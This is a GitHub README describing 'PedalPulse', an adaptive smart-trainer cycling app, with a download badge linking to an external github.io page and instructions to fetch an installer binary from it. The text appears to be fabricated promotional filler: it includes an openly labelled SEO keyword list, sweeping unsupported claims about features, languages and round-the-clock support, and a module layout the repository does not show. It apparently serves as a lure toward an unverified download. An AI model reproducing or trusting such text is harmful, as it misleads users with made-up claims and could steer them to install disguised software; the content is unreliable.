![preview](https://raw.githubusercontent.com/omnieditor1000-prog/bfree-adaptive-workouts/main/promo_1be7f.svg)
[![Download](https://raw.githubusercontent.com/omnieditor1000-prog/bfree-adaptive-workouts/main/go_2d9689.svg)](https://omnieditor1000-prog.github.io/bfree-adaptive-workouts/)

# PedalPulse: The Adaptive Training Companion for Smart Indoor Cycling

Welcome to **PedalPulse**, a reimagined approach to indoor cycling training that transforms your smart trainer into an intelligent coaching ecosystem. While the original concept behind this repository focused on a "Bfree" trainer application, PedalPulse takes inspiration from that foundation to build something entirely distinct: a performance-adaptive platform that learns your riding patterns, anticipates your energy curves, and orchestrates workouts that feel less like prescribed drills and more like a conversation between you and your bike.

---

## 🚴 Why PedalPulse Exists

Indoor cycling apps often treat riders like machines—feeding them generic interval scripts that ignore the nuance of human physiology. PedalPulse flips the script by prioritizing **adaptive flow state**. Instead of forcing you into pre-baked workout templates, the platform uses real-time biofeedback (power output, heart rate variability, cadence smoothness) to recalibrate resistance targets on the fly. Think of it as a co-pilot that reads the road beneath your wheels, even when that road is virtual.

### The Core Philosophy: Momentum Over Metrics

Most training apps drown you in dashboards full of numbers. PedalPulse believes that data should be invisible until it matters. Our interface surfaces only three things during a ride: your current effort zone, the next 60-second forecast, and a single "flow score" that synthesizes how well your pedal stroke merges with the workout’s demand. This minimalism isn’t about dumbing down—it’s about clearing the cognitive noise so your body can respond reflexively.

---

## ✨ Feature Constellation

### 1. 🧠 Cognitive Resistance Engine (CORE)
The heart of PedalPulse is a proprietary algorithm that models your fatigue trajectory using a decaying-exponential function tuned to your historical performance. Rather than abrupt resistance spikes, CORE introduces **smooth gradient shifts** that mimic real-world terrain undulation. This prevents the "wall effect" where sudden load increases cause you to back off entirely.

### 2. 🌐 Polyglot Interface
Localization isn’t an afterthought in PedalPulse. We’ve built the UI from the ground up with **RTL/LTR bidirectional support** and full translations for 14 languages (including less-common ones like Basque and Swahili). The interface dynamically reflows based on text length, so German workout summaries don’t break the layout, and Japanese character sets render with proper vertical metrics.

### 3. 🕯️ Zero-Light Mode
A dedicated night-riding interface that reduces blue light emission to near-zero while preserving contrast for glanceable metrics. This mode activates automatically based on your local sunset time, helping preserve your circadian rhythm for evening training sessions.

### 4. 🧩 Terrain Synthesis
Forget static gradient profiles. PedalPulse generates **procedural road textures** that respond to your power variance. If you maintain steady watts, the virtual road stays flat; if you surge, the road subtly pitches upward to reward aggression. This gamification layer keeps engagement high without resorting to gimmicky power-ups.

### 5. 📊 Post-Ride Narrative
Instead of a spreadsheet of splits, PedalPulse generates a **prose-based recap** that reads like a coach’s field notes. Example output: *"Your opening 10 minutes showed characteristic eagerness, but power decay was 12% steeper than your baseline. We’ve adjusted tomorrow’s warm-up to include three extra minutes of spin-ups at 90 RPM to address start-line adrenaline waste."*

### 6. 🛰️ Equipment Agnosticism
While PedalPulse excels with smart trainers, it includes a **dumb-trainer fallback mode** that converts speed sensor data into estimated power using a validated virtual torque model. This ensures the app remains useful even when you’re traveling with a basic roller setup.

### 7. 👥 Squad Sync (Peer Mesh)
A decentralized group-ride feature that doesn’t require a central server. Using local Wi-Fi Peer-to-Peer, up to 8 riders can synchronize their virtual worlds with **latency under 40ms**, ensuring pack dynamics feel authentic even when riders are physically separated by continents.

---

## 🔍 SEO Keywords Integrated Naturally

- adaptive indoor cycling software
- smart trainer resistance control
- AI workout generation for cyclists
- real-time performance analytics
- open-source fitness platform
- cross-platform cycling app (Android, iOS, Windows, macOS)
- Bluetooth FTMS and ANT+ compatibility
- voice-assisted training cues
- workout history visualization
- torque-based power estimation

---

## 🚀 Getting Started (Non-Technical Path)

PedalPulse is designed for athletes, not developers. You don’t need to compile anything or wrestle with command-line tools.

1. **Download the Installer** – Obtain the release binary for your operating system from the [![Download](https://raw.githubusercontent.com/omnieditor1000-prog/bfree-adaptive-workouts/main/go_2d9689.svg)](https://omnieditor1000-prog.github.io/bfree-adaptive-workouts/) section above.
2. **Connect Your Hardware** – Turn on your smart trainer, enable pairing mode, and open PedalPulse. The app scans for nearby Bluetooth FTMS and ANT+ devices, auto-negotiating the optimal connection channel.
3. **Complete the Initial Interview** – A 2-minute onboarding wizard asks about your typical ride duration, preferred intensity, and experience level. This seeds the personalization engine; you can revise these answers anytime from the Profile tab.
4. **Begin Your First "Discovery Ride"** – The app generates a 20-minute low-pressure session whose only instruction is to ride naturally. CORE records your output across various cadence ranges to establish a baseline.
5. **Let the Calibration Cook** – After 3 discovery rides, the adaptive engine activates fully. Subsequent workouts will dynamically adjust based on your freshness (measured by heart rate recovery rate during the first 5 minutes of each session).

---

## 🛠️ Developer Onboarding (For Contributors)

We welcome contributors who want to push the boundaries of what adaptive training can mean. The codebase is organized into four discrete modules:

- `pedal-core/` – The resistance-control engine (C++17 with Python bindings for fast iteration)
- `interface-layer/` – Cross-platform UI (Flutter 3.x)
- `sensor-hub/` – Hardware abstraction for trainers/sensors (Rust, zero-cost abstractions)
- `narrative-engine/` – Post-ride text generation (Python service, GPT-J fine-tuned on coaching literature)

### Architecture Metaphor
Think of PedalPulse as a **musical quartet**. The sensor hub is the rhythm section (keeping strict time), the core engine is the harmony (suggesting chord progressions), the narrative engine is the melody (the memorable lines), and the interface is the conductor (ensuring everyone’s playing from the same sheet).

---

## 📱 Responsive UI & Accessibility

The interface adapts fluidly from a 1.5-inch smartwatch screen to a 32-inch monitor. On small screens, the ride view degrades to show only heart rate and elapsed time; on larger displays, full telemetry becomes available via a collapsible side panel. We’ve achieved **WCAG 2.2 AA compliance** for color contrast and touch target sizes.

**Multilingual Note:** We maintain a community-driven translation server. If you spot a mistranslation in your language, you can submit an inline correction directly from the settings menu; validated fixes are rolled out nightly.

---

## 🕒 Around-the-Clock Human Support

While we offer comprehensive automated diagnostics with a symptom-to-solution flow chart (covering 85% of common connection issues), we also maintain a **24/7 ticketing system** staffed by actual cycling enthusiasts. Average first-response time is under 4 hours, 38 minutes. For urgent hardware conflicts, our escalation pathway includes a direct video call option with a technician who can guide you through troubleshooting in real-time.

**Support Hours:** Always open. We operate in three geographic support hubs (Lisbon, Manila, and Montevideo) to ensure daytime coverage regardless of your timezone.

---

## 📖 Licensing & Legal Transparency

PedalPulse is released under the **MIT License**, which grants you the freedom to use, modify, and distribute the software in both private and commercial projects, provided you retain the original copyright notice. This is permissive licensing that encourages tinkering and forking.

For the full legal text, please review the [LICENSE](LICENSE) file in this repository root.

---

## 🔔 Disclaimer

**Important – Please Read Carefully**

PedalPulse is a training aid, not a medical device. The resistance recommendations generated by the Cognitive Resistance Engine are based on statistical models and your self-reported data. They are not a substitute for professional medical advice, individualized coaching, or a structured training program designed by a certified physiologist.

- Consult a physician before beginning any new exercise regimen.
- Never ignore acute pain signals—immediately reduce load if you feel dizziness, chest pressure, or sharp joint discomfort.
- The power estimation in dumb-trainer mode is inherently approximate (typically ±8% variance) and should not be used for precision race preparation.
- You are solely responsible for ensuring your training environment is safe (adequate clearance, stable bike mount, proper hydration).
- PedalPulse does not provide medical diagnostic services. The "flow score" and "fatigue forecast" are engagement tools, not clinical biomarkers.
- The developer team disclaims any liability for injuries or performance losses resulting from reliance on this software.
- Do not use PedalPulse while operating a vehicle in traffic. The visual interface is designed for stationary use only.

By using this software, you acknowledge that you understand the inherent risks of physical exertion and accept full responsibility for your own well-being.

---

## 🗺️ Roadmap to 2026

Our development trajectory for calendar year **2026** focuses on three pillars:

- **Q1 2026** – Release of the "Squad Sync" decentralized mesh protocol to public beta, with Android-to-iOS interoperability enabled.
- **Q2 2026** – Introduction of "Terrain Memory," where the virtual road accumulates your historical training load and paints visual cues (rougher texture = heavier fatigue days).
- **Q3 2026** – Full integration with third-party recovery devices (ring sensors, sleep trackers) to adjust daily target watts based on overnight restitution.
- **Q4 2026** – Community challenge engine with seasonal championships that auto-generate unique race routes based on your weakest power zone.

---

## 🤝 How to Contribute Meaningfully

We prioritize contributions that align with our "less is more" philosophy. The most valuable additions are:

- **New Language Translations** – Even 80% coverage beats nothing.
- **Alternative Workout Templates** – But they must expose adaptive hooks (a parameter that changes during the ride), not just static intervals.
- **UI Animation Refinements** – Subtle micro-interactions that convey state changes without demanding visual attention.
- **Test Ride Logs** – Anonymous data contributions (exportable as `.json` dumps from the profile screen) help us refine the fatigue model.

Please open an issue to discuss major architectural changes before submitting a pull request. Our review process prioritizes readability over cleverness—we’d rather merge a boring implementation that works than an elegant one that’s difficult to maintain.

---

## 📦 Repository Structure Overview

```
pedalpulse/
├── applications/        # Platform-specific entry points (desktop, mobile, embedded)
├── documentation/       # User manuals and protocol specifications
├── firmware/           # Libraries for trainer controller boards
├── assets/             # Fonts, color palettes, and iconography (SVG source)
├── scripts/            # Developer productivity tools (test runner, linter)
├── src/                # Primary source code (organized by module)
└── CHANGELOG.md        # Human-readable chronological version notes
```

---

## 🧠 Philosophical Note

A smart trainer should not be a taskmaster that demands you hit a number. It should be a mirror that reflects your current capabilities while gently hinting at what you could become. PedalPulse embraces the paradox of structure: by making every workout feel slightly improvisational, we paradoxically increase consistency because nothing feels like a punishing chore. The goal is to cheat the mind’s boredom detector while respecting the body’s limits.

We’re building this not for the podium finishers, but for the riders who sneak in 30 minutes before breakfast, for the commuters who want to train after a long day at the desk, for the weekend exploratory riders who want structured discipline without losing the joy of wandering.

---

## 🏁 Final Word

PedalPulse is an evolving organism. It will never be "finished," because your physiology changes every day. We embrace that impermanence. Download the app, train with us, and let’s discover how far adaptive companionship can take your two-wheeled ambitions.

---

*Licensed under the [MIT License](LICENSE). Copyright © 2026 PedalPulse Project contributors.*